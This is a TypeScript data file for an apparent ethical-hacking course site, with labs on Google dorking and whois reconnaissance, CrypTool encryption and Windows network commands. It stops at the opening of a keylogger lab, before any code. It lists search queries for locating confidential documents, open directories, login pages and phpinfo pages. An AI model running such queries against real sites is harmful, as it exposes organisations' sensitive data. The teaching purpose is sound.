export interface LabStep {
  title: string;
  content: string;
  code?: string;
  language?: string;
  terminal?: string;
}

export interface Lab {
  id: string;
  number: number;
  title: string;
  shortTitle: string;
  icon: string;
  duration: string;
  difficulty: 'Beginner' | 'Intermediate' | 'Advanced';
  tools: string;
  description: string;
  sections: {
    id: string;
    title: string;
    content: string;
    subsections?: {
      title: string;
      content: string;
      code?: string;
      language?: string;
      terminal?: string;
      steps?: LabStep[];
      warning?: {
        type: 'info' | 'warning' | 'danger';
        title: string;
        content: string;
      };
    }[];
  }[];
}

export const labs: Lab[] = [
  {
    id: 'reconnaissance',
    number: 1,
    title: 'Reconnaissance using Google and Whois',
    shortTitle: 'Reconnaissance',
    icon: 'ri-spy-line',
    duration: 'Approximately 2 hours',
    difficulty: 'Beginner',
    tools: 'Web Browser, Command Line',
    description: 'Reconnaissance is the first phase of ethical hacking, involving collecting information about a target system. This practical lab covers passive reconnaissance techniques using Google Dorking and Whois lookups to gather intelligence without directly interacting with the target systems.',
    sections: [
      {
        id: 'overview',
        title: 'Overview',
        content: 'Reconnaissance, also known as information gathering, is a critical first step in the ethical hacking process. It involves collecting as much information as possible about a target system without actively engaging with it.',
        subsections: [
          {
            title: 'Key Techniques',
            content: 'In this lab, we will focus on two powerful reconnaissance techniques:',
            steps: [
              { title: 'Google Dorking', content: 'Using advanced search operators to find sensitive information' },
              { title: 'Whois Lookups', content: 'Querying domain registration information' }
            ]
          },
          {
            title: 'Important Note',
            content: 'Always ensure you have proper authorization before performing reconnaissance on any system or network. Unauthorized scanning or information gathering may violate laws and regulations.',
            warning: {
              type: 'info',
              title: 'Important Note',
              content: 'Always ensure you have proper authorization before performing reconnaissance on any system or network. Unauthorized scanning or information gathering may violate laws and regulations.'
            }
          }
        ]
      },
      {
        id: 'google-dorking',
        title: 'Google Dorking Techniques',
        content: 'Google Dorking is a hacking technique used to find sensitive information using advanced search operators. It helps attackers locate exposed databases, login pages, and sensitive documents.',
        subsections: [
          {
            title: 'Common Google Dorking Queries',
            content: 'Here are some of the most commonly used Google Dorks for finding sensitive information:',
            code: `# Find specific file types
site:example.com filetype:pdf

# Find directory listings
intitle:"index of"

# Find login pages
inurl:admin

# Find log files
filetype:log

# Find WordPress content
inurl:wp-content

# Find authentication pages
allinurl:auth`,
            language: 'bash'
          },
          {
            title: 'Advanced Google Dorking Examples',
            content: 'Here are more powerful search queries for targeted reconnaissance:',
            code: `# Find Excel files on government websites
site:gov filetype:xls

# Find confidential documents
"confidential" filetype:doc site:example.com

# Locate exposed PHP configuration pages
inurl:/phpinfo.php`,
            language: 'bash'
          },
          {
            title: 'Step-by-Step: Finding Exposed Documents',
            content: 'Follow these steps to search for potentially exposed documents:',
            steps: [
              { title: 'Navigate to Google', content: 'Open your browser and go to google.com' },
              { title: 'Use the filetype operator', content: 'In the search box, type: `filetype:pdf site:targetdomain.com confidential`' },
              { title: 'Analyze the results', content: 'Look for potentially sensitive documents that have been inadvertently exposed' },
              { title: 'Document your findings', content: 'Record any sensitive information discovered for your security report' }
            ]
          },
          {
            title: 'Ethical Warning',
            content: 'Only use these techniques on domains you own or have explicit permission to test. Unauthorized reconnaissance can be illegal and unethical.',
            warning: {
              type: 'warning',
              title: 'Ethical Warning',
              content: 'Only use these techniques on domains you own or have explicit permission to test. Unauthorized reconnaissance can be illegal and unethical.'
            }
          }
        ]
      },
      {
        id: 'whois-lookups',
        title: 'Whois for Domain Intelligence Gathering',
        content: 'Whois provides domain ownership and registration details, revealing valuable information about a website\'s infrastructure.',
        subsections: [
          {
            title: 'Steps to Use Whois',
            content: 'Follow these steps to effectively use Whois for intelligence gathering:',
            steps: [
              { title: 'Open Terminal', content: 'Open your command-line terminal' },
              { title: 'Run Basic Whois', content: 'Execute the command: whois example.com', terminal: 'whois example.com' },
              { title: 'Analyze Details', content: 'Review the registrar information, IP address, and contact data' },
              { title: 'Get DNS Details', content: 'Use the dig command for DNS information', terminal: 'dig example.com' },
              { title: 'Check Name Servers', content: 'Run nslookup for name server details', terminal: 'nslookup example.com' },
              { title: 'Extended Lookup', content: 'For more detailed information, use the cymru lookup', terminal: 'whois -h whois.cymru.com " -v example.com"' }
            ]
          },
          {
            title: 'Information Returned',
            content: 'This command will return information about the domain including:',
            steps: [
              { title: 'Registrar information', content: 'Details about the company where the domain was registered' },
              { title: 'Registration dates', content: 'When the domain was created and when it expires' },
              { title: 'Name servers', content: 'The DNS servers handling lookups for the domain' },
              { title: 'Domain owner', content: 'Contact details (if not protected by privacy services)' },
              { title: 'Contact information', content: 'Email, phone, address (if not protected)' }
            ]
          },
          {
            title: 'Practical Use Cases',
            content: 'Whois lookups are valuable for:',
            steps: [
              { title: 'Owner Identification', content: 'Identifying the owner of a domain for cybersecurity investigations' },
              { title: 'Subdomain Discovery', content: 'Finding potential subdomains and IP addresses linked to a target' },
              { title: 'Domain Hijacking Prevention', content: 'Gathering information on domain expiration to prevent domain hijacking' }
            ]
          },
          {
            title: 'Sample Whois Output Analysis',
            content: 'Here\'s a sample whois output for analysis:',
            code: `Domain Name: EXAMPLE.COM
Registry Domain ID: 2336799_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.iana.org
Registrar URL: http://www.iana.org
Updated Date: 2023-08-14T07:02:37Z
Creation Date: 1995-08-14T04:00:00Z
Registry Expiry Date: 2023-08-13T04:00:00Z
Registrar: IANA
Registrar IANA ID: 376
Registrar Abuse Contact Email: reserved@iana.org
Registrar Abuse Contact Phone: +1.3108239358
Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
Name Server: A.IANA-SERVERS.NET
Name Server: B.IANA-SERVERS.NET
DNSSEC: signedDelegation
URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/`,
            language: 'text'
          },
          {
            title: 'Advanced Whois Commands',
            content: 'Here are some advanced whois commands for different types of lookups:',
            code: `# Basic domain lookup
whois example.com

# IP address lookup
whois 93.184.216.34

# Specific whois server lookup
whois -h whois.arin.net 93.184.216.34

# Verbose output
whois -v example.com

# Hide legal disclaimers
whois -H example.com`,
            language: 'bash'
          }
        ]
      },
      {
        id: 'practical-exercises',
        title: 'Practical Exercises',
        content: 'Practice your reconnaissance skills with these hands-on exercises:',
        subsections: [
          {
            title: 'Exercise 1: Google Dorking Challenge',
            content: 'In this exercise, you will practice using Google Dorks to find specific information about a target domain.',
            steps: [
              { title: 'Find exposed directories', content: 'Use `intitle:"Index of /" site:example.com` to find open directories' },
              { title: 'Find login pages', content: 'Use `site:example.com inurl:login | inurl:signin | inurl:admin`' },
              { title: 'Find specific file types', content: 'Use `site:example.com filetype:pdf | filetype:doc | filetype:xls`' },
              { title: 'Document your findings', content: 'Create a report detailing what information you were able to discover' }
            ]
          },
          {
            title: 'Exercise 2: Whois Intelligence Gathering',
            content: 'In this exercise, you will use Whois lookups to gather intelligence about a domain and its related domains.',
            steps: [
              { 
                title: 'Basic Whois lookup', 
                content: 'Perform a whois lookup on example.com and document the important details',
                terminal: 'whois example.com > example_whois.txt'
              },
              { title: 'Identify name servers', content: 'Extract the name servers from the whois results and perform additional lookups on them' },
              { 
                title: 'Check for related domains', 
                content: 'If contact information is available, search for other domains registered to the same entity',
                terminal: 'whois -H "contact info" | grep "Domain Name"'
              },
              { title: 'Create a domain profile', content: 'Compile all findings into a comprehensive domain profile document' }
            ]
          }
        ]
      },
      {
        id: 'ethical-considerations',
        title: 'Ethical Considerations',
        content: 'When performing reconnaissance, ethical considerations are paramount. Here are key guidelines to follow:',
        subsections: [
          {
            title: 'Legal Boundaries',
            content: 'Always operate within legal boundaries:',
            steps: [
              { title: 'Authorization', content: 'Only perform reconnaissance on systems you own or have explicit permission to test' },
              { title: 'Legal awareness', content: 'Be aware of relevant laws and regulations in your jurisdiction' },
              { title: 'Terms of service', content: 'Respect "robots.txt" files and website terms of service' }
            ]
          },
          {
            title: 'Responsible Disclosure',
            content: 'Follow responsible disclosure practices:',
            steps: [
              { title: 'Report vulnerabilities', content: 'If you discover vulnerabilities, follow responsible disclosure practices' },
              { title: 'Direct reporting', content: 'Report findings directly to the affected organization' },
              { title: 'Remediation time', content: 'Allow sufficient time for the organization to address issues before public disclosure' }
            ]
          },
          {
            title: 'Important Warning',
            content: 'Unauthorized reconnaissance can lead to severe legal consequences, including criminal charges. Always ensure you have proper authorization before conducting any information gathering activities.',
            warning: {
              type: 'danger',
              title: 'Important Warning',
              content: 'Unauthorized reconnaissance can lead to severe legal consequences, including criminal charges. Always ensure you have proper authorization before conducting any information gathering activities.'
            }
          }
        ]
      }
    ]
  },
  {
    id: 'cryptool',
    number: 2,
    title: 'Encrypt and Decrypt Passwords using CrypTool',
    shortTitle: 'Password Encryption',
    icon: 'ri-lock-password-line',
    duration: 'Approximately 3 hours',
    difficulty: 'Beginner',
    tools: 'CrypTool, Text Editor',
    description: 'Learn how to use CrypTool to encrypt and decrypt passwords using various cryptographic algorithms. This lab will help you understand the fundamentals of encryption and how to implement secure password protection.',
    sections: [
      {
        id: 'overview',
        title: 'Overview',
        content: 'Password encryption is a fundamental security measure to protect sensitive information. In this lab, we\'ll explore CrypTool, an educational tool for cryptography and cryptanalysis.',
        subsections: [
          {
            title: 'What is CrypTool?',
            content: 'CrypTool is an educational software designed to demonstrate cryptographic algorithms and concepts. It provides a visual and interactive way to understand how encryption and decryption work.'
          },
          {
            title: 'Learning Objectives',
            content: 'In this lab, you will:',
            steps: [
              { title: 'Install CrypTool', content: 'Download and set up the CrypTool application' },
              { title: 'Learn Basic Encryption', content: 'Understand principles of symmetric and asymmetric encryption' },
              { title: 'Practice Password Security', content: 'Apply encryption techniques to secure passwords' },
              { title: 'Compare Algorithms', content: 'Evaluate different cryptographic methods (AES, RSA, DES, etc.)' }
            ]
          }
        ]
      },
      {
        id: 'installation',
        title: 'Installation and Setup',
        content: 'Follow these steps to download and install CrypTool on your system:',
        subsections: [
          {
            title: 'Download CrypTool',
            content: 'Visit the official website to download the latest version of CrypTool:',
            steps: [
              { title: 'Navigate to CrypTool Website', content: 'Go to https://www.cryptool.org' },
              { title: 'Select Version', content: 'Choose the appropriate version for your operating system' },
              { title: 'Download the Installer', content: 'Click on the download link and save the file to your computer' }
            ]
          },
          {
            title: 'Installation Process',
            content: 'Install CrypTool on your system:',
            steps: [
              { title: 'Run the Installer', content: 'Double-click the downloaded file to start the installation process' },
              { title: 'Follow Instructions', content: 'Accept the license agreement and follow the installation wizard' },
              { title: 'Complete Installation', content: 'Click "Finish" when the installation is complete' },
              { title: 'Launch CrypTool', content: 'Open CrypTool from your desktop or start menu' }
            ]
          }
        ]
      },
      {
        id: 'basic-usage',
        title: 'Basic Encryption and Decryption',
        content: 'Learn how to perform basic encryption and decryption operations in CrypTool:',
        subsections: [
          {
            title: 'Creating a New Document',
            content: 'To get started with encryption:',
            steps: [
              { title: 'Open CrypTool', content: 'Launch the CrypTool application' },
              { title: 'Create New Document', content: 'Go to File -> New or press Ctrl+N' },
              { title: 'Enter Text', content: 'Type a sample password or text to encrypt, such as "MySecurePassword123!"' }
            ]
          },
          {
            title: 'Encrypting with AES',
            content: 'Encrypt your text using the Advanced Encryption Standard (AES):',
            steps: [
              { title: 'Select Encryption', content: 'Go to Encrypt/Decrypt and choose AES Encryption' },
              { title: 'Enter Key', content: 'Provide a secret key (must be 16, 24, or 32 bytes for AES)' },
              { title: 'Set Parameters', content: 'Choose mode (CBC, ECB, etc.) and other parameters as needed' },
              { title: 'Execute Encryption', content: 'Click "OK" to encrypt the text' },
              { title: 'Save Result', content: 'Copy or save the encrypted text for later use' }
            ]
          },
          {
            title: 'Decrypting with AES',
            content: 'Decrypt the previously encrypted text:',
            steps: [
              { title: 'Open New Document', content: 'Create a new document and paste the encrypted text' },
              { title: 'Select Decryption', content: 'Go to Encrypt/Decrypt and choose AES Decryption' },
              { title: 'Enter Key', content: 'Enter the same secret key used for encryption' },
              { title: 'Match Parameters', content: 'Ensure all parameters match those used during encryption' },
              { title: 'Execute Decryption', content: 'Click "OK" to decrypt the text' },
              { title: 'Verify Result', content: 'Confirm that the decrypted text matches the original input' }
            ]
          }
        ]
      },
      {
        id: 'advanced-features',
        title: 'Advanced Encryption Features',
        content: 'Explore more advanced cryptographic features available in CrypTool:',
        subsections: [
          {
            title: 'Comparing Encryption Algorithms',
            content: 'CrypTool supports various encryption algorithms:',
            steps: [
              { title: 'Symmetric Algorithms', content: 'AES, DES, 3DES, RC4, etc.' },
              { title: 'Asymmetric Algorithms', content: 'RSA, DSA, ElGamal, etc.' },
              { title: 'Hash Functions', content: 'SHA-1, SHA-256, MD5, etc.' }
            ]
          },
          {
            title: 'RSA Encryption Example',
            content: 'To use RSA encryption:',
            steps: [
              { title: 'Generate Key Pair', content: 'Go to Key -> Generate Key Pair -> RSA' },
              { title: 'Set Key Length', content: 'Choose a key size (2048 bits recommended for security)' },
              { title: 'Save Keys', content: 'Save both the public and private keys' },
              { title: 'Encrypt with RSA', content: 'Select Encrypt/Decrypt -> RSA and use the public key' },
              { title: 'Decrypt with RSA', content: 'Use the private key to decrypt the text' }
            ]
          },
          {
            title: 'Analyzing Encryption Strength',
            content: 'CrypTool offers tools to analyze encryption strength:',
            steps: [
              { title: 'Analyze Entropy', content: 'Use Analysis -> Entropy to measure randomness' },
              { title: 'Frequency Analysis', content: 'Perform statistical analysis on encrypted text' },
              { title: 'Cryptanalysis Tools', content: 'Try using built-in cryptanalysis features to test encryption strength' }
            ]
          }
        ]
      },
      {
        id: 'practical-applications',
        title: 'Practical Applications',
        content: 'Understand how encryption is used in real-world cybersecurity scenarios:',
        subsections: [
          {
            title: 'Password Storage',
            content: 'How encrypted passwords are stored in systems:',
            steps: [
              { title: 'Password Hashing', content: 'Converting passwords to irreversible hash values' },
              { title: 'Salting', content: 'Adding random data to passwords before hashing' },
              { title: 'Secure Storage', content: 'Implementing proper database security for credential storage' }
            ]
          },
          {
            title: 'Secure Communications',
            content: 'Protecting data during transmission:',
            steps: [
              { title: 'TLS/SSL', content: 'Understanding how Transport Layer Security works' },
              { title: 'VPN Encryption', content: 'How Virtual Private Networks use encryption' },
              { title: 'End-to-End Encryption', content: 'Implementing complete confidentiality for communications' }
            ]
          },
          {
            title: 'Practical Use Cases',
            content: 'Real-world applications of encryption:',
            steps: [
              { title: 'Secure Credentials', content: 'Encrypting sensitive user credentials before storing them in databases' },
              { title: 'Protected Communication', content: 'Securing data exchange between applications using encryption' },
              { title: 'Educational Purposes', content: 'Demonstrating cryptographic concepts in cybersecurity courses' }
            ]
          }
        ]
      },
      {
        id: 'lab-exercises',
        title: 'Lab Exercises',
        content: 'Practice your encryption skills with these hands-on exercises:',
        subsections: [
          {
            title: 'Exercise 1: Password Encryption Challenge',
            content: 'Create and test encrypted passwords:',
            steps: [
              { title: 'Create Password List', content: 'Generate a list of sample passwords with varying complexity' },
              { title: 'Encrypt with AES', content: 'Encrypt each password using AES with different keys' },
              { title: 'Test Decryption', content: 'Verify that all passwords can be correctly decrypted' },
              { title: 'Document Results', content: 'Record encryption time, output size, and security observations' }
            ]
          },
          {
            title: 'Exercise 2: Algorithm Comparison',
            content: 'Compare different encryption algorithms:',
            steps: [
              { title: 'Select Sample Text', content: 'Choose a standard text sample to encrypt' },
              { title: 'Apply Multiple Algorithms', content: 'Encrypt the text using AES, DES, and RSA' },
              { title: 'Measure Performance', content: 'Compare encryption/decryption speed, output size, and security level' },
              { title: 'Create Comparison Chart', content: 'Document the advantages and disadvantages of each algorithm' }
            ]
          },
          {
            title: 'Exercise 3: Practical Implementation',
            content: 'Design a secure password management solution:',
            steps: [
              { title: 'Define Requirements', content: 'Outline the security needs for a password manager' },
              { title: 'Select Algorithms', content: 'Choose appropriate encryption methods for different data types' },
              { title: 'Design Architecture', content: 'Create a schematic showing how encryption will be implemented' },
              { title: 'Document Security Measures', content: 'Detail the encryption strategies, key management, and security precautions' }
            ]
          }
        ]
      }
    ]
  },
  {
    id: 'windows-commands',
    number: 3,
    title: 'Windows Command Analysis (ifconfig, ping, netstat, traceroute)',
    shortTitle: 'Windows Commands',
    icon: 'ri-terminal-box-line',
    duration: 'Approximately 2 hours',
    difficulty: 'Beginner',
    tools: 'Windows Command Prompt, PowerShell',
    description: 'Learn how to use essential Windows networking commands for system analysis and troubleshooting. This lab covers ifconfig, ping, netstat, and traceroute with practical examples and analysis.',
    sections: [
      {
        id: 'overview',
        title: 'Overview',
        content: 'Windows command-line tools provide powerful capabilities for network diagnostics and system analysis. In this lab, we\'ll explore key networking commands that are essential for security professionals.',
        subsections: [
          {
            title: 'Learning Objectives',
            content: 'In this lab, you will:',
            steps: [
              { title: 'Understand Basic Commands', content: 'Learn key network diagnostic commands available in Windows' },
              { title: 'Run Practical Analysis', content: 'Execute commands to diagnose network connectivity issues' },
              { title: 'Interpret Results', content: 'Learn to read and analyze the output of networking commands' },
              { title: 'Apply Security Principles', content: 'Use these commands for security assessments and troubleshooting' }
            ]
          },
          {
            title: 'Command-Line Environments',
            content: 'Windows offers multiple command-line interfaces:',
            steps: [
              { title: 'Command Prompt (cmd.exe)', content: 'Traditional Windows command interpreter' },
              { title: 'PowerShell', content: 'More advanced shell with scripting capabilities' },
              { title: 'Windows Terminal', content: 'Modern terminal application that can run multiple shells' }
            ]
          }
        ]
      },
      {
        id: 'ipconfig',
        title: 'Network Configuration with ipconfig',
        content: 'The ipconfig command displays the current network configuration of the system, including IP addresses, subnet masks, and default gateways.',
        subsections: [
          {
            title: 'Basic ipconfig Usage',
            content: 'The ipconfig command can be used with various parameters:',
            terminal: 'ipconfig /all'
          },
          {
            title: 'Common ipconfig Options',
            content: 'Here are the most useful options for ipconfig:',
            steps: [
              { title: 'ipconfig', content: 'Displays basic IP configuration for all adapters', terminal: 'ipconfig' },
              { title: 'ipconfig /all', content: 'Shows detailed network configuration', terminal: 'ipconfig /all' },
              { title: 'ipconfig /release', content: 'Releases the IP address for the specified adapter', terminal: 'ipconfig /release' },
              { title: 'ipconfig /renew', content: 'Renews IP configuration for all adapters', terminal: 'ipconfig /renew' },
              { title: 'ipconfig /flushdns', content: 'Clears the DNS resolver cache', terminal: 'ipconfig /flushdns' },
              { title: 'ipconfig /displaydns', content: 'Displays the DNS resolver cache', terminal: 'ipconfig /displaydns' }
            ]
          },
          {
            title: 'Sample Output Analysis',
            content: 'A typical ipconfig /all output includes:',
            code: `Windows IP Configuration

Host Name . . . . . . . . . . . . : DESKTOP-PC
Primary Dns Suffix  . . . . . . . : example.local
Node Type . . . . . . . . . . . . : Hybrid
IP Routing Enabled. . . . . . . . : No
WINS Proxy Enabled. . . . . . . . : No
DNS Suffix Search List. . . . . . : example.local

Ethernet adapter Ethernet:
   Connection-specific DNS Suffix  . : example.local
   Description . . . . . . . . . . . : Intel(R) Ethernet Connection I217-LM
   Physical Address. . . . . . . . . : 00-11-22-33-44-55
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 192.168.1.100(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Lease Obtained. . . . . . . . . . : Monday, March 25, 2025 8:30:45 AM
   Lease Expires . . . . . . . . . . : Tuesday, March 26, 2025 8:30:45 AM
   Default Gateway . . . . . . . . . : 192.168.1.1
   DHCP Server . . . . . . . . . . . : 192.168.1.1
   DNS Servers . . . . . . . . . . . : 192.168.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled`,
            language: 'text'
          },
          {
            title: 'Security Applications',
            content: 'Using ipconfig for security assessments:',
            steps: [
              { title: 'Network Reconnaissance', content: 'Understanding the local network configuration' },
              { title: 'DHCP Issues', content: 'Identifying DHCP-related security problems' },
              { title: 'DNS Configuration', content: 'Checking DNS server settings for potential DNS hijacking' },
              { title: 'Network Adapter Analysis', content: 'Identifying all network adapters, including virtual ones that may be suspicious' }
            ]
          }
        ]
      },
      {
        id: 'ping',
        title: 'Network Connectivity with ping',
        content: 'The ping command tests connectivity between your computer and another device or website by sending ICMP Echo Request packets and waiting for responses.',
        subsections: [
          {
            title: 'Basic ping Usage',
            content: 'The ping command is used to test basic connectivity:',
            terminal: 'ping google.com'
          },
          {
            title: 'Common ping Options',
            content: 'Here are the most useful options for ping:',
            steps: [
              { title: 'ping [host]', content: 'Basic ping to a host or IP address', terminal: 'ping google.com' },
              { title: 'ping -t [host]', content: 'Continuous ping until manually stopped', terminal: 'ping -t 8.8.8.8' },
              { title: 'ping -n [count] [host]', content: 'Sends a specific number of ping requests', terminal: 'ping -n 5 192.168.1.1' },
              { title: 'ping -l [size] [host]', content: 'Specify the size of the ping packet in bytes', terminal: 'ping -l 1500 google.com' },
              { title: 'ping -i [TTL] [host]', content: 'Set the Time To Live value for the ping', terminal: 'ping -i 64 example.com' }
            ]
          },
          {
            title: 'Sample Output Analysis',
            content: 'A typical ping output includes:',
            code: `Pinging google.com [142.250.200.110] with 32 bytes of data:
Reply from 142.250.200.110: bytes=32 time=15ms TTL=57
Reply from 142.250.200.110: bytes=32 time=14ms TTL=57
Reply from 142.250.200.110: bytes=32 time=14ms TTL=57
Reply from 142.250.200.110: bytes=32 time=15ms TTL=57

Ping statistics for 142.250.200.110:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 14ms, Maximum = 15ms, Average = 14ms`,
            language: 'text'
          },
          {
            title: 'Security Applications',
            content: 'Using ping for security assessments:',
            steps: [
              { title: 'Host Discovery', content: 'Identifying active hosts on a network' },
              { title: 'Network Latency', content: 'Measuring response times to identify potential issues' },
              { title: 'TTL Analysis', content: 'Examining Time-To-Live values to detect potential spoofing' },
              { title: 'Packet Loss Analysis', content: 'Identifying network stability issues or potential DoS conditions' }
            ]
          }
        ]
      },
      {
        id: 'netstat',
        title: 'Network Connections with netstat',
        content: 'The netstat command displays active TCP connections, ports on which the computer is listening, Ethernet statistics, and more.',
        subsections: [
          {
            title: 'Basic netstat Usage',
            content: 'The netstat command shows network connection information:',
            terminal: 'netstat -an'
          },
          {
            title: 'Common netstat Options',
            content: 'Here are the most useful options for netstat:',
            steps: [
              { title: 'netstat -a', content: 'Displays all active connections and listening ports', terminal: 'netstat -a' },
              { title: 'netstat -n', content: 'Shows addresses and port numbers in numerical form', terminal: 'netstat -n' },
              { title: 'netstat -b', content: 'Shows the executable involved in creating each connection (requires admin)', terminal: 'netstat -b' },
              { title: 'netstat -o', content: 'Displays process IDs for each connection', terminal: 'netstat -o' },
              { title: 'netstat -r', content: 'Displays the routing table', terminal: 'netstat -r' },
              { title: 'netstat -an', content: 'Combination of -a and -n flags for comprehensive output', terminal: 'netstat -an' }
            ]
          },
          {
            title: 'Sample Output Analysis',
            content: 'A typical netstat -an output includes:',
            code: `Active Connections

Proto  Local Address          Foreign Address        State
TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
TCP    127.0.0.1:6000         0.0.0.0:0              LISTENING
TCP    127.0.0.1:6000         127.0.0.1:54302        ESTABLISHED
TCP    127.0.0.1:54302        127.0.0.1:6000         ESTABLISHED
TCP    192.168.1.100:54303    142.250.200.110:443    ESTABLISHED
UDP    0.0.0.0:3389           *:*
UDP    0.0.0.0:5353           *:*
UDP    127.0.0.1:1900         *:*`,
            language: 'text'
          },
          {
            title: 'Security Applications',
            content: 'Using netstat for security assessments:',
            steps: [
              { title: 'Open Port Identification', content: 'Finding potentially vulnerable open ports' },
              { title: 'Suspicious Connections', content: 'Identifying unauthorized or unusual network connections' },
              { title: 'Malware Detection', content: 'Using -b and -o flags to identify processes with unexpected connections' },
              { title: 'Network Baseline', content: 'Establishing a normal connection baseline for future comparison' }
            ]
          }
        ]
      },
      {
        id: 'tracert',
        title: 'Network Path Analysis with tracert',
        content: 'The tracert (traceroute) command shows the path that packets take to reach a destination, displaying each hop along the route.',
        subsections: [
          {
            title: 'Basic tracert Usage',
            content: 'The tracert command traces the route to a destination:',
            terminal: 'tracert google.com'
          },
          {
            title: 'Common tracert Options',
            content: 'Here are the most useful options for tracert:',
            steps: [
              { title: 'tracert [host]', content: 'Basic trace to a host or IP address', terminal: 'tracert google.com' },
              { title: 'tracert -d [host]', content: 'Prevents hostname lookup (speeds up trace)', terminal: 'tracert -d 8.8.8.8' },
              { title: 'tracert -h [max_hops] [host]', content: 'Specifies the maximum number of hops', terminal: 'tracert -h 15 example.com' },
              { title: 'tracert -w [timeout] [host]', content: 'Sets the timeout for each reply in milliseconds', terminal: 'tracert -w 1000 google.com' }
            ]
          },
          {
            title: 'Sample Output Analysis',
            content: 'A typical tracert output includes:',
            code: `Tracing route to google.com [142.250.200.110]
over a maximum of 30 hops:

  1     1 ms     1 ms     1 ms  192.168.1.1
  2    15 ms    14 ms    15 ms  10.0.0.1
  3    16 ms    15 ms    16 ms  172.16.1.1
  4    18 ms    17 ms    17 ms  isp-gateway.example.net [203.0.113.1]
  5    20 ms    19 ms    20 ms  core-router-1.isp.example [203.0.113.18]
  6    22 ms    21 ms    21 ms  core-router-2.isp.example [203.0.113.26]
  7    25 ms    24 ms    25 ms  edge-router.isp.example [203.0.113.30]
  8    30 ms    29 ms    30 ms  google-peering.example.net [198.51.100.10]
  9    32 ms    31 ms    32 ms  142.250.200.110

Trace complete.`,
            language: 'text'
          },
          {
            title: 'Security Applications',
            content: 'Using tracert for security assessments:',
            steps: [
              { title: 'Network Mapping', content: 'Understanding the routing infrastructure between two points' },
              { title: 'Route Hijacking Detection', content: 'Identifying unexpected routing changes that could indicate hijacking' },
              { title: 'Network Latency Analysis', content: 'Finding bottlenecks or abnormal delays in the network' },
              { title: 'ISP Infrastructure Reconnaissance', content: 'Gathering information about the network infrastructure of targets' }
            ]
          }
        ]
      },
      {
        id: 'practical-exercises',
        title: 'Practical Exercises',
        content: 'Apply what you\'ve learned with these hands-on exercises:',
        subsections: [
          {
            title: 'Exercise 1: Network Configuration Analysis',
            content: 'In this exercise, you will use ipconfig to analyze your system\'s network configuration:',
            steps: [
              { title: 'View Basic Configuration', content: 'Run `ipconfig` and note your IP address', terminal: 'ipconfig' },
              { title: 'View Detailed Configuration', content: 'Run `ipconfig /all` and identify all network adapters', terminal: 'ipconfig /all' },
              { title: 'Examine DNS Cache', content: 'Run `ipconfig /displaydns` to see cached DNS entries', terminal: 'ipconfig /displaydns' },
              { title: 'Document Findings', content: 'Create a report summarizing your system\'s network configuration' }
            ]
          },
          {
            title: 'Exercise 2: Network Connection Monitoring',
            content: 'In this exercise, you will use netstat to monitor and analyze network connections:',
            steps: [
              { title: 'View All Connections', content: 'Run `netstat -an` and identify all active connections', terminal: 'netstat -an' },
              { title: 'Identify Process Owners', content: 'Run `netstat -anob` (as administrator) to see which processes own connections', terminal: 'netstat -anob' },
              { title: 'Monitor Changes', content: 'Run `netstat -an` before and after launching a web browser, and note the differences', terminal: 'netstat -an > before.txt' },
              { title: 'Analyze Open Ports', content: 'Create a list of all listening ports and research their typical uses' }
            ]
          },
          {
            title: 'Exercise 3: Network Path Analysis',
            content: 'In this exercise, you will trace routes to various destinations:',
            steps: [
              { title: 'Local Network Trace', content: 'Run `tracert` to your default gateway', terminal: 'tracert 192.168.1.1' },
              { title: 'Internet Trace', content: 'Run `tracert` to a major website like google.com', terminal: 'tracert google.com' },
              { title: 'International Trace', content: 'Trace to an international website and note the difference in path', terminal: 'tracert bbc.co.uk' },
              { title: 'Compare Routes', content: 'Create a visual map of the different paths packets take to different destinations' }
            ]
          }
        ]
      },
      {
        id: 'practical-use-cases',
        title: 'Practical Use Cases',
        content: 'Real-world applications of these networking commands:',
        subsections: [
          {
            title: 'Diagnosing Network Issues',
            content: 'Using commands for troubleshooting:',
            steps: [
              { title: 'Connectivity Problems', content: 'Using ping and tracert to identify where connections are failing' },
              { title: 'DNS Resolution Issues', content: 'Using ipconfig /flushdns to clear corrupt DNS cache entries' },
              { title: 'Performance Troubleshooting', content: 'Using ping with various packet sizes to test network throughput' }
            ]
          },
          {
            title: 'Security Applications',
            content: 'Using commands for security assessments:',
            steps: [
              { title: 'Suspicious Connection Detection', content: 'Using netstat to identify unauthorized connections' },
              { title: 'Network Footprinting', content: 'Using tracert to understand network topology' },
              { title: 'Incident Response', content: 'Using these commands during security incidents to understand the scope of compromise' }
            ]
          },
          {
            title: 'Network Documentation',
            content: 'Creating comprehensive network documentation:',
            steps: [
              { title: 'IP Address Inventory', content: 'Using ipconfig to document all network interfaces' },
              { title: 'Service Inventory', content: 'Using netstat to document all listening services' },
              { title: 'Routing Documentation', content: 'Using tracert to document network paths to critical services' }
            ]
          }
        ]
      }
    ]
  },
  {
    id: 'keylogger',
    number: 4,
    title: 'Develop a Keylogger in Python',
    shortTitle: 'Python Keylogger',
    icon: 'ri-keyboard-box-line',
    duration: 'Approximately 4 hours',
    difficulty: 'Intermediate',
    tools: 'Python, Text Editor',
    description: 'Learn how to create a basic keylogger using Python to understand how this type of malware works. This knowledge is essential for security professionals to develop countermeasures against such threats.',
    sections: [
      {
        id: 'overview',
        title: 'Overview',
        content: 'A keylogger is a program that records keystrokes made by a user. In this lab, we\'ll develop a simple keylogger in Python to understand its working principles and potential security implications.',
        subsections: [
          {
            title: 'What is a Keylogger?',
            content: 'A keylogger is a type of surveillance software that records keystrokes made by a user. These programs can be used legitimately by IT departments for troubleshooting technical problems, by parents to monitor their children\'s online activities, or maliciously by attackers to steal sensitive information like passwords and credit card numbers.',
            warning: {
              type: 'warning',
              title: 'Legal Considerations',
